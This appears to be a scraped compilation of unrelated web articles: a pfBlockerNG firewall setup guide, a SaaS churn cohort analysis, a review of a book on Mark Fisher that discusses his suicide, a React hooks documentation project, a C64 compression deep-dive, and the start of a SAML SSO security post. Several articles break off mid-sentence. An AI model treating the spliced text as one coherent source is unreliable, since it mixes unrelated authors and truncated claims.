<figure><img loading="lazy" width="800" height="382" src="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_15.png" alt="pfBlockerNG Safe Search Config" srcset="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_15.png 800w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_15-300x143.png 300w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_15-768x367.png 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption>DNSBL SafeSearch</figcaption></figure>
<h4>DNSBL &amp; IP Feeds</h4>
<p>We recommend you activate additional DNSBL not enabled by the pfBlockerNG Setup Wizard. To do that, you must select ‘Feeds’ and simply select the + next to the ones you would like to add. <strong>DO NOT</strong> select all feeds – we don’t add any IP feeds but instead limit our additions to DNSBL ‘Easylist’, all Ad Blockers, and some of the Malicious options. Don’t worry if some of the lists have duplicates, pfBlockerNG will make sure each entry exists only once. </p>
<figure><img loading="lazy" width="800" height="216" src="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_16.png" alt="pfBlockerNG Feeds" srcset="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_16.png 800w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_16-300x81.png 300w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_16-768x207.png 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption><em>DNSBL &amp; IP Feeds</em></figcaption></figure>
<h4>Feed Grouping and Setup</h4>
<p>pfBlockerNG groups DNSBL together on its own. You will need to access these groups to make sure they are enabled and properly configured. This page also allows you to remove a list whose URL is no longer active or that you no longer want to use. The main things to check are that the ‘State’ is ‘ON’ and the ‘Action’ is ‘Unbound’.</p>
<figure><img loading="lazy" width="800" height="539" src="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_17.png" alt="pfBlockerNG DNSBL Config" srcset="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_17.png 800w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_17-300x202.png 300w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_17-768x517.png 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption>Feed Grouping and Setup</figcaption></figure>
<h2>Adult Content Limitations</h2>
<p>The pfBlockerNG configuration above does a great job at everything we’ve discussed, but falls a bit short when it comes to blocking adult content. There is an option under DNSBL Category ‘Blacklists’ where you can enable Shallalist to block adult sites, but the list is large and not comprehensive. Other similar lists are also resource intensive so we ditched these lists and instead setup our pfSense firewall to use <a rel="noreferrer noopener" href="https://blog.cloudflare.com/introducing-1-1-1-1-for-families/" target="_blank">Cloudflare Family</a>&nbsp;as our DNS provider – a free service that blocks both adult content and malware. This paired with our pfSense firewall running pfBlockerNG gives us everything we need for a safe home network. </p>
<h2>Final Tweaks</h2>
<p>At this point you should have pfBlockerNG configured and running on your network. Now all devices on your network will enjoy blocked ads, improved security, and more privacy while online. Further pfBlockerNG tuning might be needed if you discover a page blocked or want additional blocks – just hop back into pfSense to make your tweaks. </p>
<p>Hope this helped you get pfSense pfBlockerNG setup on your home network. Let us know if we missed something or you have any questions.</p>

<![CDATA[How We Reduced Churn by 87.5%]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>This was posted in 2012 on my personal blog. It unpacks the analysis we did to understand why we were churning customers at my first SaaS business, SocialWOD, and what we did about it.</p>

<p>I was stressing.</p>

<p>We had seen 40% of our customers cancel, and it was eating me up inside.</p>

<p>Each of those (former) customers had:</p>
<ol>
<li>decided they had the problem SocialWOD solves (workout tracking for every gym member at your gym, just by snapping and emailing a photo of your results whiteboard)</li>
<li>decided they needed to solve that problem</li>
<li>done research on solutions that might solve their problem</li>
<li>decided that SocialWOD was compelling enough to try</li>
<li>decided to take out their credit card to pay SocialWOD</li>
<li>used and promoted SocialWOD to their members</li>
</ol>

<p>After investing that much mental and emotional energy, they then they decided to cancel.</p>

<p>Argh.</p>

<p>We were trying to understand what the key differences were between our customers that cancelled, and our customers that didn’t.</p>

<p>We hop on the phone every week or two to call up customers, so qualitative data was no problem.</p>

<p>But we wanted to see what we could learn from our data.</p>
      <h2 id="enter-the-cohort-analysis">
        
        
          Enter the Cohort Analysis <a href="#enter-the-cohort-analysis">#</a>
        
        
      </h2>

<p>A cohort analysis helps you see how behavior varies across different cohorts of customers.</p>

<p>In this case, we were interested in the behavior of the cohort of customers who HAD cancelled, vs the behavior of those that hadn’t. What differences were there in each cohort’s usage of our product, and could we steer more gyms to do things like those gyms that had stayed on as customers?</p>

<p>I had read high-level stuff about cohort analyses, but it was <a href="http://www.skillshare.com/Introduction-to-Marketing-Cohort-Analysis/794424332">this 90 minute cohort analysis class in NY</a> with genius marketer Cassie Lancellotti-Young that really opened my eyes to how to run a proper one.</p>
    
      

<p>Cassie recommended using Excel, and provided a template to use as the basis for a cohort analysis.</p>

<p>She mentioned tools like Kissmetrics and Mixpanel, but they were harder to use, less flexible, and required more overhead than Excel.</p>

<p>Given that likely all of the useful data you’ll want to analyze lives in your application’s database, her suggestion made a ton of sense to me.</p>
    
      <h2 id="how-to-start">
        
        
          How to start <a href="#how-to-start">#</a>
        
        
      </h2>

<p>We started by asking questions.</p>

<p>In this case, we were trying to answer this question:</p>

<p>“What are the major differences between customers that cancel, and customers that don’t?”</p>
    
      <h2 id="pull-some-data">
        
        
          Pull some data <a href="#pull-some-data">#</a>
        
        
      </h2>

<p>The next step was to write a ginormous SQL query pulling out all the data that could possibly help us answer this question.
Here’s some of the relevant data we pulled:</p>

<ul>
<li>The month a customer joined in</li>
<li>The amount a customer paid per month</li>
<li>Free trial length</li>
<li>The number of a gym's members that claimed their SocialWOD profiles</li>
<li># days after paying before canceling their service</li>
<li>whether a gym uses SocialWOD to post their workouts to their gym's Facebook page (where the gym's members hang out)</li>
</ul>

<p>All in all, there were 51 different fields of data that we pulled.</p>
    
      <h2 id="analyze-the-raw-data">
        
        
          Analyze the raw data <a href="#analyze-the-raw-data">#</a>
        
        
      </h2>

<p>I ran pivot tables comparing the difference between gyms that cancelled and gyms that didn’t.</p>

<p>I learned that customers who cancelled:</p>
<ol>
<li>had about half as many of their members claim a SocialWOD profile (so they could engage with our product)</li>
<li>used the "post our workout results to my gym's Facebook page" feature about half as much as gyms who remained customers</li>
<li>paid about 23% more than gyms who stayed</li>
<li>cancelled their subscription after 61 days on average</li>
</ol>

<p><a href="https://www.reemer.com/images/articles/cancellation-cohort-analysis.png"><img title="cancellation-cohort-analysis" src="https://www.reemer.com/images/articles/cancellation-cohort-analysis.png"></a></p>

<p><a href="https://www.reemer.com/images/articles/cancellation-cohort-analysis-2.png"><img title="cancellation-cohort-analysis-2" src="https://www.reemer.com/images/articles/cancellation-cohort-analysis-2.png"></a></p>
    
      <h2 id="square-the-quantitative-with-the-qualitative">
        
        
          Square the quantitative with the qualitative <a href="#square-the-quantitative-with-the-qualitative">#</a>
        
        
      </h2>
<p>We have a spreadsheet that details cancellation reasons for every customer, and I’d estimate we’ve talked to at least half of the customers who quit.
The two most common reasons we kept hearing about why gyms quit were:</p>
<ol>
<li>our athletes aren't using it</li>
<li>it's too expensive. SocialWOD is a nice-to-have (we're working on that ;) ). A member CRM is essentially a must-have for a gym over a certain size. The price for a member CRM is lower that it should be imho, and it sets a strong price anchor in the mind of a customer (i.e. "I *need* a CRM and it costs $X. I don't *need* SocialWOD, but it costs $1.5X.")</li>
</ol>
<p>Given that the quantitative data suggested high member usage and lower price were big drivers of customer retention, the qualitative and quantitative data told a pretty strong story about what to do to cut down on cancellations.</p>

          Acting on the results <a href="#acting-on-the-results">#</a>
        
        
      </h2>

<p>Here’s what we decided to do about each learning:</p>

<p><strong>1. A cancelled customer had about half as many of their members claim a SocialWOD profile (so they could engage with our product).<br></strong><br>Previously, our customers would tell their members to sign up for SocialWOD by posting an announcement about SocialWOD on their gym’s Facebook page, writing on their gym’s blog (read by most members), talking about SocialWOD at the gym, etc.
We figured there’s nothing easier to act on than an email describing benefits and a call-to-action. So we improved our onboarding to help a gym owner export a CSV of their members’ email addresses to send to us.
Once they do, we email each member a description of how SocialWOD benefits them, along with a link to click to sign up.</p>

<p><strong>2. A cancelled customer used the “post our workout results to my gym’s Facebook page” feature about half as much as gyms who remained customers.<br></strong><br>We improved our onboarding so that customers who haven’t set up posting to Facebook receive an email detailing the benefits, providing a video, and a strong CTA to do so.</p>

<p><strong>3. A cancelled customer paid about 23% more than gyms who stayed<br></strong><br>We built some technology than makes processing photos cheaper for larger gyms, and passed those savings on to both our existing and new customers. Those changes enabled us to drop prices by 15-60%, depending on price plan.</p>

<p><strong>4. A customer cancelled their subscription after 61 days on average<br></strong><br>We haven’t acted on this yet, but I can imagine sending gyms that meet some “likely to cancel” criteria an offer around day 45 of their membership to lock in for a year at a heavy discount.</p>
    
      <h2 id="the-outcome">
        
        
          The Outcome <a href="#the-outcome">#</a>
        
        
      </h2>

<p>Since implementing changes 1-3 two months ago, we’ve seen our cancellation rate drop from 40% to 5% - <strong>an 87.5% decrease</strong>. We’re going to run another cohort analysis in a couple months to isolate the impact of each change as it’s still too early to know the long-term impact of these changes, but in the short-term both Ryan and I are stoked about stopping the hemorrhaging.</p>

            <!--kg-card-begin: markdown--><h3 id="onmattcolquhounsegressandmarkfisher">On Matt Colquhoun's <em>Egress</em> and Mark Fisher</h3>
<hr>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p><span>I</span>n January 2017, the leftist English blogger, critic, and cultural theorist Mark Fisher killed himself. Fisher had often connected his struggles with depression with the malaise of life in the shadow of what he referred to as “capitalist realism”: the collective belief that no future is possible beyond the neoliberal dispensation. He had also <a href="https://www.theguardian.com/commentisfree/2012/jul/16/mental-health-political-issue">argued extensively</a> against the current tendency to depoliticize mental illness. Those who have written about Fisher’s death have faced the challenge of taking these arguments seriously, while not reducing his suicide to a political symptom and thereby overwriting what was irreducibly personal about it.</p>
<p>Fisher’s former student Matt Colquhoun takes up this challenge in <em>Egress: On Mourning, Melancholy, and the Fisher-Function</em>, the first book-length study to date of Fisher’s work. Colquhoun’s genre-crossing book explores his experience of his teacher’s suicide and the period of mourning he shared with Fisher’s friends and associates in light of the latter’s ideas about mourning, melancholy, and politics. Like Fisher, Colquhoun accepts the premise that “the personal is political,” but in a particular way. In his 2014 book <em>Ghosts of My Life</em>, Fisher wrote that “[t]he most productive way of reading the ‘personal is political’ is to interpret it as saying: the personal is impersonal. It’s miserable for anyone at all to be themselves . . . Culture, and the analysis of culture, is valuable insofar as it allows an escape from ourselves.” Likewise, Colquhoun explores a range of cultural and theoretical materials in search of modes of “egress”—that is, of “escape from ourselves” and beyond the limited horizons of capitalist realism.</p>
<p>A central instance of the book’s fusion of the personal and political is Colquhoun’s use of the academic literature on “left melancholia” to theorize his and others’ experiences after Fisher’s death. Melancholia became a salient topic among left-wing intellectuals during the early 1990s end-of-history moment, when the “communist horizon” vanished and capitalist realism took hold.</p>
<p>Freud’s “Mourning and Melancholia,” which furnished the vocabulary of these discussions, compares the two states of dejection that the title names in order to define melancholia more precisely. As Fisher glossed Freud: “whereas mourning is the slow, painful withdrawal of libido from the lost object, in melancholia, libido remains attached to what has disappeared.” In the case of left melancholia, the “lost object” is revolution and the communist future.</p>
<p>Based on Freud’s account, some accounts of left melancholia have presented it as a pathological perpetuation of the inevitable phase of mourning that follows political failure. In this version, elaborated by Wendy Brown among others, melancholia is a hindrance to furthering collective projects, and thus something to be overcome. Others, such as Enzo Traverso, have argued that the apparent excessiveness of melancholia contains productive political possibilities. Colquhoun follows Fisher in advocating for the latter position, and makes the case for the revolutionary potential found in the extreme psychological states provoked by loss.</p>
<p>Fisher adapted Jacques Derrida’s neologism “hauntology” to evoke the melancholic presence within 21st-century culture of futures never realized by the 20th century’s utopian projects. He differentiated between the sterile nostalgia of “retro” culture and a distinct “hauntological melancholia” attuned not so much to the specific contents of earlier historical moments as to the conditions of possibility, trajectories, and energies embedded within them. While nostalgic retro culture may fall into the pathological impasses Freud and Brown identified, Fisher argued, hauntological melancholia might conversely sustain a defiance of “the closed horizons of capitalist realism” and inspire “a refusal to adjust to what current conditions call ‘reality.’”</p>
<p>Colquhoun develops this idea, suggesting that mourning transfigured into melancholia can render visible the “impossible Real” hidden by capitalist realism. Central to this claim is Jacques Lacan’s notion of the Real as that which any socially defined “reality” suppresses. For Fisher, “one strategy against capitalist realism could involve invoking the Real(s) underlying the reality that capitalism presents to us.” “Negative Reals” such as mental illness and climate catastrophe, that is, might “allow us to see Kapital’s striplit mall of the mind for what it actually is.”</p>
<p><em>Egress</em> folds these inquiries back onto the narrative of Fisher’s own life and death. In particular, it explores the possibilities found within the collective experience of his mourning among his students, friends and colleagues. As Colquhoun writes, “the surreality of death as it is experienced by those that remain alive injects a strangeness deep into the heart of our communities [and] ruptures the strange behaviours we take for granted.” Drawing upon Georges Bataille and Maurice Blanchot, he considers the ways that “grief and historical failure” can forge “strangely hopeful communities,” and reflects on the potential contained in experiences of rupture. In a different register, Colquhoun builds upon Fisher’s unfinished “Acid Communism” project, which focused on the link between “limit experiences” and collectivist politics.</p>
<p>It is here that both authors’ use of the term “egress” becomes both pivotal and ambiguous. This term is a  variant on “exit,” which originated in the theories of Albert O. Hirschman. In <em>Exit, Voice, and Loyalty</em>, Hirschman identified two predominant responses to the type of crisis that weakens loyalty within any organization (such as a state, party, or business). “Voice,” in the political context at least, refers to any electoral or non-electoral effort to introduce reforms or challenge the power structure. Hence, both the Bernie Sanders campaign and Black Lives Matter protests would fall under this heading. “Exit,” on the other hand, refers in the simplest sense to emigration. It has recently become a favored term in parts of the libertarian right, the idea being that exit generates a market signal that can force change more directly than politics.</p>
<p>The tension in Fisher’s and Colquhoun’s use of “egress” is that in Hirschman’s original version, “exit” is fundamentally apolitical or anti-political, whereas politics is the realm of “voice.” Fisher’s late work, which grounds Colquhoun’s deployment of the term, tries to redefine exit (rebranded as “egress”) in terms closer to Herbert Marcuse’s “Great Refusal”—a “saying no” to the totality of capitalist realism. One pathway for such escapes, for Fisher and Colquhoun as for Marcuse, is aesthetic. Music, literature, and other art forms, they argue, can defamiliarize and de-routinize ordinary experience, allowing us to glimpse the opportunities for escape concealed within it.</p>
<p>Yet how exactly aesthetic experience becomes the basis of a revolutionary collective subjectivity remains somewhat unclear. Fisher’s unfinished “Acid Communism” manuscript returned to the countercultures of the 1960s and ‘70s, where he believed unfinished projects of this sort could be discerned. Fisher’s other way of thinking about egress, conversely, was a future-oriented technological accelerationism, an often misunderstood dimension of his work.</p>
<p>One way to understand Fisher’s account of accelerationism is by way of the previously mentioned trend of retro nostalgia. For Fisher, this trend illustrates the idea, drawn from Deleuze and Guattari, that capitalism is simultaneously transformational and conservative, in that it “engenders and inhibits processes of destratification.” Thus, it leads us through a rapid succession of cultural periods, yet in retro nostalgia the accumulated residue of earlier epochs becomes a source of inertia that closes off new cultural possibilities. The political corollary of this nostalgia is the cross-partisan melancholic longing for the midcentury Fordist dispensation.</p>
<p>Rejecting the retro-nostalgic mode of left melancholia, Fisher instead calls for a “left that can speak. . . in the name of an alien future, that can openly celebrate, rather than mourn, the disintegration of existing socialities and territorialities.” Yet paradoxically, in making this case he returns again to the past, proposing renewed attention to the ruins of past utopian projects not as objects of nostalgia but as sites of buried potentiality. For example, in a discussion of the decrepit monuments of Soviet futurism, he proposes that “we grasp them as relics from a yet-to-be-realised post-capitalist future in which desire and communism are joyfully reconciled.”</p>
<p>Colquhoun’s foregrounding of Fisher’s accelerationism is a worthwhile provocation to the contemporary left’s frequent hostility to technology. But in the end, both he and Fisher seem unable to plausibly link accelerationist exit and collectivist politics. Colquhoun asserts, for instance, that the technological transformations capitalism has brought about in recent years help make revolution imaginable again, because they have “demonstrated the plasticity of our drives.” That is, “if a biological foundation for communicative capitalism can be libidinally engineered in as little as ten years, as Apple’s iPhone has masterfully demonstrated, surely we can re-engineer these drives to establish new foundations for socialism and/or communism in another not-so-distant future.” But who is the “we” in this passage? It can only refer to a future entity, what Colquhoun refers to elsewhere as “a communist subject, or a subject that is the product of collective enunciation.” The statement, then, turns out to be circular: the plural subject who should be the agent of the engineering is actually what needs to be engineered.</p>
<p>Despite the emphasis on “egress,” then, Colquhoun’s and Fisher’s leftist politics cannot do without voice. Right-wing advocates of exit, …</p></div></div>

September 2, 2020 | https://kickstartcoding.online/learn/articles/i-converted-reactjs-org-to-use-hooks/ | <a href="https://web.archive.org/web/*/https://kickstartcoding.online/learn/articles/i-converted-reactjs-org-to-use-hooks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><a target="_blank" href="https://kickstartcoding.online/learn/articles/hooks-or-not-hooks">When we decided to convert our React curriculum to React Hooks</a>, one of the biggest stumbling blocks we ran into was that almost all of the guides, tutorials, and blog posts about React Hooks are written with the assumption that the audience already knows React. Most resources are written from the perspective of ”How to switch from class-style React to hooks-style React”, not “How to learn hooks-style React from scratch”.</p>
<p>Our curriculum has a lot of supplementary reading links in it and it wasn't clear where we would be able to find supplementary reading that taught React Hooks with a beginner rather than a veteran audience in mind.</p>
<p>After some discussion, we came up with a possible solution. <a target="_blank" href="https://reactjs.org/">The ReactJS.org documentation</a> is an excellent resource for all things React, but the beginner guides and tutorial still use class-based React, and the hooks guides have the "aimed at React veterans" problem. This makes sense for these guides in context — a lot of people are still using class-style React, and most of the audience for hooks probably <em>is</em> React veterans — it just doesn't make as much sense for us as a coding school.</p>
<p>But the ReactJS.org site is also completely open source. So we thought: what if we just…updated it ourselves?</p>
<p>We decided to take a stab at doing just that and see how it went. This part of our curriculum update fell to me, so a couple of months ago I cloned the ReactJS.org repo and started experimenting to see how hard it would be to get up and running, adapted, and deployed.</p>
<h2>The Result</h2>
<p>It took a lot of work, and I’ll be talking about all the ins and outs of the update in a future post, because there were a lot of interesting challenges both pedagogically and technically. But for now the result is live at <a target="_blank" href="https://reactwithhooks.netlify.app/">reactwithhooks.netlify.app</a>, and you can take a look at the repo where the changes were made at <a target="_blank" href="https://github.com/kickstartcoding/reactjs.org/tree/convert-all-to-hooks">github.com/kickstartcoding/reactjs.org</a> on <a target="_blank" href="https://github.com/kickstartcoding/reactjs.org/tree/convert-all-to-hooks">the convert-all-to-hooks branch</a>.</p>
<p>The places you’ll find most of the converted examples and explanations are <a target="_blank" href="https://reactwithhooks.netlify.app/tutorial/tutorial.html">the tutorial</a>, <a target="_blank" href="https://reactwithhooks.netlify.app/docs/hello-world.html">the main concepts sections</a>, and <a target="_blank" href="https://reactwithhooks.netlify.app/docs/accessibility.html">the advanced guides sections</a>. For those, we converted the concept explanations, the directions, and all of the examples (including the ones on CodePen so you can see and run working code snippets). Everything from the step-by-step directions for writing a tic-tac-toe game in React to explanations on how to integrate React with older library’s like Backbone.js is now written with hooks in mind.</p>
<p>We hope this will be a useful resource for anyone who either wants to learn React the hooks way from scratch, or who wants to see examples and/or explanations of some of the more complex React concepts implemented in the hooks style.</p>
<h2>Helping Out</h2>
<p>There were a few sections that were particularly tricky to figure out how to convert, or to figure out if conversion was even possible. If you’d like to help us out, take a look at <a target="_blank" href="https://github.com/kickstartcoding/reactjs.org/tree/convert-all-to-hooks#unresolved-issues-with-modifying-the-docs-to-be-100-hooks">the ”unresolved issues” section of the README</a> and let us know if you know how to handle any of the things we couldn’t figure out.</p>
<div><p><img src="https://kickstartcoding.online/media-content/share/1599066782/407/"></p><p>There's still work left to do!</p>
</div><p>Also, of course, please let us know about any issues or bugs you fine to us the converted documentation. We definitely want to make sure it is as useful and error-free as possible.</p>
<h2>Fin.</h2>
<p>All in all, making this adaptation was one of the most fun projects I’ve been able to work on recently. We got a chance to use it as a resource for students during our last cohort, and it seemed to work pretty well. I’m hoping that it will be useful for other people trying to learn React as well, so check it out and let us know what you think!</p>

<h2><a href="https://yupferris.github.io/blog/2020/08/31/c64-4k-intro-packer-deep-dive.html">C64 4k intro packer deep-dive</a></h2>

<p>In <a href="https://yupferris.github.io/blog/2019/02/11/rANS-on-6502">an earlier post</a>, I talked about building an <a href="https://en.wikipedia.org/wiki/Asymmetric_numeral_systems">rABS</a> entropy decoder on <a href="https://en.wikipedia.org/wiki/MOS_Technology_6502">6502</a>, which became the heart of my new 4k intro packer experiment for <a href="https://en.wikipedia.org/wiki/Commodore_64">C64</a>. While exploring several different <a href="https://en.wikipedia.org/wiki/Entropy_encoding">entropy coder</a> variants for simple <a href="https://en.wikipedia.org/wiki/LZ77_and_LZ78">LZ</a> codecs, and in particular tANS or an approximation of it with adaptive probabilities (spoiler alert: this was a dead-end), I realized that rANS was not only a possible alternative, but actually an OK fit for the system, providing a high precision entropy coder with… well, <em>good enough</em> decode speed and a not-as-tricky-as-I-had-originally-feared implementation :) .</p>

<p>However, I intentionally left out several details of the rest of the codec. The earlier post only describes how the entropy decoder is implemented and some of the modeling, the combination of which is kindof the novel thing here. But essentially, it only gives us a way to pull modeled bits out of an encoded bitstream. The bits we actually encode/decode and how we model those is what a codec is <em>really</em> all about; the entropy coding part, while certainly important, is really just a piece of machinery that allows us to build the rest of the codec effectively and take as much advantage of the modeling choices we make as possible.</p>

<p>So, in this post I’d like to go into detail about the rest of the codec, including the LZ scheme chosen, how we model various symbols, how some of these techniques were chosen/tested, and several parts of the encoder. I’ll save the rABS-specific encoding details/intuitions for a future post where I can talk about that specifically in more depth.</p>

<!-- excerpt -->

<p>Before I dig into the current codec details, I want to talk about where the design came from, why I embarked on this journey in the first place, and how things evolved over time.</p>

<p>Back in 2017, for <a href="http://www.pouet.net/prod.php?which=70972">makeshift</a>, my first 4k intro for the C64, I developed a custom LZ compressor to compress all code/data. This compressor was called “<strong>Admiral P4kbar</strong>”, a name which contained both “pack” and “4k” in some form along with a stupid pun; quite the satisfying trifecta. Anyways, when the intro runs, it first relocates the compressed data and decompressor, decompresses the compressed data into memory, and then returns to BASIC to run the decompressed code. This relocation is necessary as we want to pack the intro into a contiguous memory region starting in BASIC memory to make the intro easier to run (just <code>LOAD</code> + <code>RUN</code>, no <code>SYS 1337</code> or whatever nonsense), but the decompressed data also needs to decompress into BASIC memory so we can use BASIC to generate a sine table, which is used in several effects. But I’m digressing a bit already - what I want to talk about specifically is the LZ codec design used there, so we can eventually get to the new packer’s design.</p>

<blockquote>
  <p>Makeshift is <a href="https://github.com/yupferris/makeshift">open-source</a>! You can find the compressor code <a href="https://github.com/yupferris/makeshift/blob/master/admiral-p4kbar/src/main.rs">here</a> and the decompressor code <a href="https://github.com/yupferris/makeshift/blob/master/makeshift.asm">here</a>. The new packer is unfortunately not part of this source release, but will be available when we do our next C64 4k :) .</p>
</blockquote>

<h2 id="apv1-details">apv1 details</h2>

<p>The LZ codec used in Admiral P4kbar (which I’ll now refer to as “<strong>apv1</strong>” for brevity) is relatively straightforward - the data is encoded using a sequence of <em>literals</em> and <em>backreferences</em> (usually called <em>matches</em> in LZ parlance, but I just happened to have called them backreferences in this case because <em>reasons</em>). Literals are coded as a single <code>0</code> control bit followed by a raw 8-bit sequence (no entropy coding here); backferences are coded as a single <code>1</code> control bit followed by a simple entropy-coded <em>length</em> and <em>distance</em> pair. Both of these fields are coded the same way: an index into a 16-entry table is <a href="https://en.wikipedia.org/wiki/Unary_coding">unary-coded</a>, and then the corresponding table entry specifies a 16-bit <em>base</em> value and a number of <em>additional bits</em> (0-15) to read in and add to the base value, which results in the final field value (similar to <a href="https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Markov_chain_algorithm">LZMA’s “distance slots”</a> which are sort of an adjustable <a href="https://en.wikipedia.org/wiki/Elias_gamma_coding">gamma coding</a>-like scheme; this kind of thing is <a href="http://cbloomrants.blogspot.com/2015/02/02-10-15-lz-offset-modeling-rambles.html">really common</a> in LZ codecs). Different tables are used for each field. Lengths always use the same table; distances use one of two tables, one if the length for the current backreference is <code>1</code>, and the other for all other lengths. The tables themselves are coded as 16 4-bit bit counts (packed in nybbles); each entry’s base is the previous entry’s base + 2 to the power of the previous entry’s additional bit count. This packed table representation does introduce some overhead into the coded bitstream (24 bytes always), but is certainly not a bad way to represent/transmit symbol probabilities to the decoder.</p>

<p>Most of the encoding ideas in apv1 came from <a href="https://bitbucket.org/magli143/exomizer/wiki/Home">Exomizer</a>, the de facto standard for data compression for C64 (and other platforms where the decoder environment is limited). Particularly, the distance/length table scheme is totally stolen from there; as is the algorithm to optimally search for the best table bit counts given a set of symbols and their frequencies (which I reimplemented myself as a learning exercise of course, but it’s the same core idea). The exact tables used differ slightly, but this isn’t terribly important. Both compressors also use a similar iterative scheme to find the best parse/encoding pair given the input data: First, an optimal LZ parse given the current best encoding (initially some predetermined “seed” encoding) is found (which is straightforward as there’s no adaptive modeling during coding), and then an optimal encoding is found for the symbols used in that parse. These steps are repeated one after another until no further gains are achieved; usually only a few iterations (2-3) are performed before we find a minima (ideally global but likely local) and we’re done.</p>

<p>Ultimately, apv1 performs worse than Exomizer, and somewhat embarrassingly, has a slightly larger decompressor to boot. In the end I never actually tested Exomizer on the final binary (only a few times early in the development of apv1 for comparison), but I had <a href="https://gist.github.com/yupferris/3d27f8a845c895aed2c0dd6c5493e174">estimated</a> that the intro would have been about 100 bytes smaller had we used Exomizer instead. Not an enormous margin, but definitely would have helped to not have to reduce some of our effects so much, or at least have some nicer/smoother transitions.</p>

<p>That said, I’m not entirely unsatisfied with apv1 - it was developed rather quickly in conjuction with the rest of the intro for <a href="https://www.solskogen.no/">Solskogen</a> that year, and it was a <em>really</em> good exercise for me. Before that I had done some trivial LZ codecs before, but nothing that performed very well or really even did much bit IO, much less entropy coding in any proper capacity. At the same time though, I wasn’t able to experiment with it as much as I would have liked due to the project timeline, and compression suffered a bit as a result. Nevertheless, I decided to use apv1 anyways (because making/using your own custom packer is always rad!) and made the 4k limit just fine (coming in at 4095 bytes after loads of aggressive hand-optimizing, which is normal for 4k’s), but I always knew we could do a little better, and that I would want to take another stab at this eventually. <strong>At the very least, I had to beat Exomizer, at least for this specialized use case.</strong></p>

<p>I didn’t end up touching the project for another year and a half or so, but when developing <a href="http://logicoma.io/squishy/">squishy</a>, I spent some time exploring ways to compress the (somewhat large) decompressor for further size gains. This turned out to be a pretty fruitful endeavor, and not just for that packer - as it turns out, the LZ scheme I implemented (after reading a <a href="http://cbloomrants.blogspot.com/">couple</a> <a href="https://fgiesen.wordpress.com/">great</a> blogs for fun) turned out to be pretty effective on makeshift as well. Granted, the exact same construction wasn’t phenomenal, since the codec was highly tuned to the decompressor it was compressing (as it should be!). But it was promising, very simple (to keep the decompressor as small as possible), and easy to tweak - so naturally I wanted to see if it could be something useful if adjusted for a C64 implementation.</p>

<h2 id="squishys-decompressor-compressor"><a href="http://logicoma.io/squishy/">squishy</a>’s decompressor compressor</h2>

<p>squishy’s decompressor compressor (which I’ll now refer to as “<strong>stage2</strong>”, as it compresses the second decompression stage in that packer) uses a very simple LZ-based coding scheme. As usual, there are two types of <em>packets</em>: <em>literals</em>, which represent single bytes, and <em>matches</em>, which represent copies of data previously seen by the codec. Both types of packets start with an entropy-coded 4-bit <em>length</em> field. A value of 0 for length means the packet is a literal; all other values denote a match, and represent how many bytes the match will copy. Following the length field for literals we have an 8-bit <em>value</em> field (this is the literal’s byte data); for matches we have an 11-bit <em>offset</em> field that determines how far behind the write pointer the copy starts. Matches with length 1 are allowed, and as is common with LZ codecs, a match with length &gt; offset is permitted (assuming a match copy is performed forward byte-by-byte, this is a nice way to “implicitly” support repetitions/<a href="https://en.wikipedia.org/wiki/Run-length_encoding">RLE</a> sequences). A match with an offset of 0 is possible to encode but never used (this wouldn’t make any sense for the decoder, which hasn’t seen the next byte yet), as using an implicit match offset bias doesn’t provide any compression gains in this case and the decoder is a tiny bit smaller without it. There are no repeated offsets.</p>

<p>All of the fields in the stage2 encoding (length, literal value, and match offset) are entropy-coded with the same modeling scheme using a 32-bit arithmetic coder (33 bit in the encoder for carry propagation) that shifts in/out whole bytes at a time. Each type of field gets a separate binary tree of bit predictions, identical to the <a href="https://github.com/jljusten/LZMA-SDK/blob/master/DOC/lzma-specification.txt#L511">“normal scheme” described in the LZMA specification</a>. All predictions are 12 bits and use a very simple fixed-point Howard/Vitter-style update scheme <a href="https://fgiesen.wordpress.com/2015/05/26/models-for-adaptive-arithmetic-coding/">as described by ryg</a>, but using a divide instead of a shift for the update …</p></section></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><p>If you’re here, you’ve likely been tasked with building SAML-based SSO as a requirement for an enterprise deal. If you’re just diving into the problem space of SSO / SAML, we’d first suggest checking out <a href="https://workos.com/blog/the-developers-guide-to-sso">The Developer’s Guide to SSO</a>. Otherwise, buckle up for a brief but titillating foray into why XML-based authentication is... challenging.</p><h2>Why is SAML SSO so vulnerability-prone</h2><p>The attack surface for SAML authentication is extensive, mostly due to the fact that SAML is XML-based. <a href="https://everypageispageone.com/2016/01/28/why-does-xml-suck/">XML is a semantic-free meta-language</a> - it’s hard to form, hard to read, and hard to parse. Combined with the high complexity of the <a href="http://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.pdf">SAML specification</a> and the number of parties involved in establishing authentication, we get what often feels like a <a href="http://www.laputan.org/mud/mud.html">big ball of mud</a> and all the accompanying implications. Be prepared to tackle a steep learning curve, lots of bugs, high maintenance costs, attack vectors galore, and an absurd spread of edge cases.</p><p>Most SAML SSO security vulnerabilities are introduced by Service Providers (SPs) improperly validating and processing SAML responses received from Identity Providers (IdPs). This happens because SAML SSO is typically not a core-value feature for an application, nor is the implementation common knowledge for most developers. Unknowns become even more unlikely to be identified and addressed when the pressure is on to just deliver <em>something </em>to unblock a high-value contract - as is oftentimes the case. However, to build SAML SSO safely and securely in-house requires significant buy-in and <a 